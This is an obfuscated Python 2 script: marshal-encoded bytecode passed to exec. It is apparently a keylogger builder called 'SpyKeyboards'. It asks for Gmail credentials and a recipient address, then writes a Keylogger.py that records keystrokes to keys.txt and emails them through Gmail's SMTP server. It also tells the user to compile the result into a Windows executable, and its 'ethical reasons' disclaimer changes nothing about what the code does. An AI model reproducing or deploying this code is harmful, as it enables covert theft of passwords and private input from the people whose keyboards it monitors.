import marshal
exec(marshal.loads('''c\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00@\x00\x00\x00s\x9c\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00d\x00\x00d\x01\x00l\x01\x00Z\x01\x00d\x02\x00\x84\x00\x00Z\x02\x00d\x03\x00d\x0f\x00d\x04\x00\x84\x00\x00\x83\x00\x00YZ\x03\x00d\x05\x00GHe\x01\x00j\x04\x00d\x06\x00\x83\x01\x00\x01d\x07\x00GHd\x08\x00GHd\t\x00GHe\x05\x00d\n\x00\x83\x01\x00Z\x06\x00e\x05\x00d\x0b\x00\x83\x01\x00Z\x07\x00e\x05\x00d\x0c\x00\x83\x01\x00Z\x08\x00d\x08\x00GHd\r\x00GHd\x0e\x00GHe\x02\x00e\x06\x00e\x07\x00e\x08\x00\x83\x03\x00\x01d\x01\x00S(\x10\x00\x00\x00i\xff\xff\xff\xffNc\x03\x00\x00\x00\x04\x00\x00\x00\x07\x00\x00\x00C\x00\x00\x00sD\x00\x00\x00t\x00\x00j\x01\x00d\x01\x00d\x02\x00\x83\x02\x00\x8f,\x00}\x03\x00|\x03\x00j\x02\x00d\x03\x00|\x00\x00\x17d\x04\x00\x17|\x01\x00\x17d\x05\x00\x17|\x02\x00\x17d\x06\x00\x17\x83\x01\x00\x01Wd\x00\x00QXd\x00\x00S(\x07\x00\x00\x00Ns\x0c\x00\x00\x00Keylogger.pyt\x01\x00\x00\x00ws\xfe\x01\x00\x00\n#!/bin/usr/python\n# -*- coding: utf-8 -*-\n\nimport threading\nimport os\nimport keyboard\nimport smtplib\nfrom time import sleep\n\n\n\n \ndef keylogger():\n\n    FILE_NAME = "keys.txt"\n    CLEAR_ON_STARTUP = False\n    TERMINATE_KEY = "enter"\n\n    if CLEAR_ON_STARTUP:\n        os.remove(FILE_NAME)\n    \n    output = open(FILE_NAME, "a")\n    \n    for string in keyboard.get_typed_strings(keyboard.record(TERMINATE_KEY)):\n        output.write(string)\n    \n    output.close()\n\ndef sendmail():\n\n     \n\n   \n\n    gmail_user = "s\x18\x00\x00\x00"\n    gmail_password = "s!\x00\x00\x00"\n    FROM =gmail_user\n    TO = "s#\x03\x00\x00"\n    SUBJECT= "key" \n\n        \n    sleep(7.0)\n    try:\n        F = open("keys.txt","r")\n\n        TEXT= F.read()\n        message = """\\From: %s\nTo: %s\nSubject: %s\n\n%s\n        """ % (FROM, ", ".join(TO), SUBJECT, TEXT)\n    except:\n        print "error"\n\n    try: \n        server =smtplib.SMTP("smtp.gmail.com", 587)\n        server.ehlo()\n        server.starttls()\n        server.login(gmail_user,gmail_password)\n        server.sendmail(FROM, TO, message)\n        server.close()\n        print "eviado"\n    except:\n        print "error"\n\n\nos.system("nano keys.txt")\n\nwhile True:\n \n    if __name__ == "__main__":\n        \n        key = threading.Thread(target=keylogger)\n        mail = threading.Thread(target=sendmail)\n\n \n        key.start()\n        mail.start()\n \n        key.join()\n        mail.join()\n \n(\x03\x00\x00\x00t\x02\x00\x00\x00iot\x06\x00\x00\x00FileIOt\x05\x00\x00\x00write(\x04\x00\x00\x00t\x07\x00\x00\x00usuariot\x08\x00\x00\x00passwordt\x06\x00\x00\x00email1t\x04\x00\x00\x00file(\x00\x00\x00\x00(\x00\x00\x00\x00s\x06\x00\x00\x00<seni>t\x08\x00\x00\x00generate\x05\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x15\x01\x06&\x17*t\x07\x00\x00\x00bcolorsc\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00B\x00\x00\x00s2\x00\x00\x00e\x00\x00Z\x01\x00d\x00\x00Z\x02\x00d\x01\x00Z\x03\x00d\x02\x00Z\x04\x00d\x03\x00Z\x05\x00d\x04\x00Z\x06\x00d\x05\x00Z\x07\x00d\x06\x00Z\x08\x00RS(\x07\x00\x00\x00s\x05\x00\x00\x00\x1b[94ms\x05\x00\x00\x00\x1b[92ms\x05\x00\x00\x00\x1b[31ms\x05\x00\x00\x00\x1b[93ms\x04\x00\x00\x00\x1b[0ms\x04\x00\x00\x00\x1b[1ms\x05\x00\x00\x00\x1b[41m(\t\x00\x00\x00t\x08\x00\x00\x00__name__t\n\x00\x00\x00__module__t\x04\x00\x00\x00BLUEt\x05\x00\x00\x00GREENt\x03\x00\x00\x00REDt\x06\x00\x00\x00YELLOWt\x04\x00\x00\x00ENDCt\x04\x00\x00\x00BOLDt\x05\x00\x00\x00BGRED(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x06\x00\x00\x00<seni>R\t\x00\x00\x00\\\x00\x00\x00s\x0e\x00\x00\x00\x06\x01\x06\x01\x06\x01\x06\x01\x06\x01\x06\x01\x06\x01s\x05\x00\x00\x00\x1b[31ms\x1c\x00\x00\x00figlet -f future SpyKeyboards\xaf\x00\x00\x00\n\x1b[31m[+]\x1b[37mAuthor : GunadiCBR & AfelzCBR\n\x1b[31m[+]\x1b[37mDate   : 20-10-2018\n\x1b[31m[+]\x1b[37mGithub : https://github.com/afelfgie\n\x1b[31m[+]\x1b[37mTeam   : Mls18hckr & hackerabalabalt\x01\x00\x00\x00 s]\x00\x00\x00\x1b[31;1m[+] \x1b[37;1mThis tool was created for ethical reasons, I am not responsible for misuse.s\x1f\x00\x00\x00\x1b[31;1mEnter your email :\x1b[37m s"\x00\x00\x00\x1b[31;1mEnter your password :\x1b[37m s\'\x00\x00\x00\x1b[31;1mEnter your email receive :\x1b[37m sR\x00\x00\x00\x1b[31;1m[+] \x1b[37;1mYour keylogger is ready, compile it to .exe in a Windows machines+\x00\x00\x00\x1b[31m[+] \x1b[37mThanks For Using My Tool...:V(\x00\x00\x00\x00(\t\x00\x00\x00R\x01\x00\x00\x00t\x02\x00\x00\x00osR\x08\x00\x00\x00R\t\x00\x00\x00t\x06\x00\x00\x00systemt\t\x00\x00\x00raw_inputR\x04\x00\x00\x00R\x05\x00\x00\x00R\x06\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x06\x00\x00\x00<seni>t\x08\x00\x00\x00<module>\x03\x00\x00\x00s\x1e\x00\x00\x00\x0c\x01\x0c\x01\tW\x13\t\x05\x01\r\x05\x05\x02\x05\x01\x05\x02\x0c\x01\x0c\x01\x0c\x01\x05\x01\x05\x01\x05\x02'''))